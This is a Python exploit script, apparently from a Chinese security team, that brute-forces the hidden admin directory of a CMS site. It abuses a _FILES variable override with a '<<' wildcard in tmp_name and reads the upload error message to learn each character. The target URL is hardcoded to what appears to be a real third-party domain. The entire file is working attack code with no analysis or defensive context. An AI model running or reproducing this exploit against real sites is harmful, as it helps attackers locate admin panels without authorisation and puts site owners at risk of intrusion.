#!/usr/bin/env python
'''/*
    * author = Mochazz
    * team   = 红日安全团队
    * env    = pyton3
    *
    */
'''
import requests
import itertools

# proxies = {
#     "http": "socks5://127.0.0.1:1080",
#     'https': 'socks5://127.0.0.1:1080'
# }

characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
back_dir = ""
flag = 0
url = "http://www.yx-tongxunlu.com/"
data = {
    "_FILES[mochazz][tmp_name]" : "./{p}<</images/adminico.gif",
    "_FILES[mochazz][name]" : 0,
    "_FILES[mochazz][size]" : 0,
    "_FILES[mochazz][type]" : "image/gif"
}

for num in range(1,7):
    if flag:
        break
    for pre in itertools.permutations(characters,num):
        pre = ''.join(list(pre))
        data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=pre)
        print("testing",pre)
        r = requests.post(url,data=data)#,proxies=proxies)
        if "Upload filetype not allow !" not in r.text and r.status_code == 200:
            flag = 1
            back_dir = pre
            data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
            break
        else:
            data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
print("[+] 前缀为：",back_dir)
flag = 0
for i in range(30):
    if flag:
        break
    for ch in characters:
        if ch == characters[-1]:
            flag = 1
            break
        data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=back_dir+ch)
        r = requests.post(url, data=data)
        if "Upload filetype not allow !" not in r.text and r.status_code == 200:
            back_dir += ch
            print("[+] ",back_dir)
            data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
            break
        else:
            data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"

print("后台地址为：",back_dir)